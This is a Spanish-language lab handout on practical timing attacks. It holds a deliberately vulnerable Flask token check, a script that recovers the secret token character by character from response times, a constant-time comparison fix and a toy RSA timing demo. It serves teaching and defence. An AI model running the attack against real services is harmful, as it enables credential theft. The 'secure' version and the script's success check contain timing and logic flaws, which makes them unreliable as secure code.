# Laboratorio 5: Timing Attacks Prácticos

## Objetivos

1. Implementar timing attack contra comparación de strings
2. Medir diferencias de tiempo en operaciones criptográficas
3. Implementar contramedidas constant-time
4. Analizar vulnerabilidades en código real

## Duración: 2 horas

---

## Parte 1: Timing Attack Básico

### Servidor Vulnerable

```python
#!/usr/bin/env python3
import time
from flask import Flask, request

app = Flask(__name__)
SECRET_TOKEN = "SuperSecretToken123!"

@app.route('/api/auth')
def vulnerable_auth():
    user_token = request.args.get('token', '')

    # ❌ VULNERABLE: Comparación byte-a-byte
    if user_token == SECRET_TOKEN:
        return {"status": "authenticated"}
    else:
        return {"status": "denied"}, 401

if __name__ == '__main__':
    app.run(port=5000)
```

### Ataque

```python
#!/usr/bin/env python3
import requests
import time
import string

TARGET = "http://localhost:5000/api/auth"
CHARSET = string.ascii_letters + string.digits + "!@#$%"

def measure_response_time(token):
    """Mide tiempo de respuesta"""
    times = []
    for _ in range(10):  # Promedio de 10 intentos
        start = time.perf_counter()
        requests.get(TARGET, params={'token': token})
        end = time.perf_counter()
        times.append(end - start)

    return sum(times) / len(times)

# Ataque carácter por carácter
recovered = ""
for pos in range(30):  # Máx 30 caracteres
    max_time = 0
    best_char = ''

    for char in CHARSET:
        test_token = recovered + char + 'X' * (29 - pos)
        avg_time = measure_response_time(test_token)

        if avg_time > max_time:
            max_time = avg_time
            best_char = char

    recovered += best_char
    print(f"Recovered so far: {recovered}")

    if measure_response_time(recovered) > 0.1:  # Autenticado
        print(f"\n✅ Token recovered: {recovered}")
        break
```

---

## Parte 2: Contramedida Constant-Time

### Comparación Segura

```python
def constant_time_compare(a, b):
    """Comparación en tiempo constante"""
    if len(a) != len(b):
        return False

    result = 0
    for x, y in zip(a, b):
        result |= ord(x) ^ ord(y)

    return result == 0

@app.route('/api/secure_auth')
def secure_auth():
    user_token = request.args.get('token', '')

    # ✅ SEGURO: Constant-time compare
    if constant_time_compare(user_token, SECRET_TOKEN):
        return {"status": "authenticated"}
    else:
        time.sleep(0.01)  # Delay fijo para ocultar timing
        return {"status": "denied"}, 401
```

---

## Parte 3: Timing Attack en RSA

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import time

key = RSA.generate(2048)
cipher = PKCS1_OAEP.new(key)

def vulnerable_decrypt(ciphertext):
    """Descifrado vulnerable a timing"""
    plaintext = cipher.decrypt(ciphertext)
    # Procesamiento dependiente de plaintext
    time.sleep(len(plaintext) * 0.0001)
    return plaintext

# Atacante mide tiempo de descifrado
ciphertext = cipher.encrypt(b"Secret message")

times = []
for _ in range(100):
    start = time.perf_counter()
    vulnerable_decrypt(ciphertext)
    end = time.perf_counter()
    times.append(end - start)

print(f"Tiempo promedio: {sum(times)/len(times):.6f}s")
# Variaciones revelan longitud del mensaje
```

---

## Ejercicios

1. Implementar timing attack contra password checking
2. Medir diferencias de tiempo en AES con diferentes claves
3. Implementar blinding en RSA para prevenir timing attacks
4. Analizar código real en busca de vulnerabilidades timing

---

## Checklist

- [ ] Timing attack exitoso contra comparación vulnerable
- [ ] Constant-time compare implementado
- [ ] Diferencias de tiempo medidas con precisión
- [ ] Contramedidas validadas

---

## Referencias

- **Kocher (1996)**: "Timing Attacks on Implementations of Diffie-Hellman, RSA, DSS"
- **NCC Group**: "Practical Timing Side Channel Attacks"

**Duración**: 2 horas
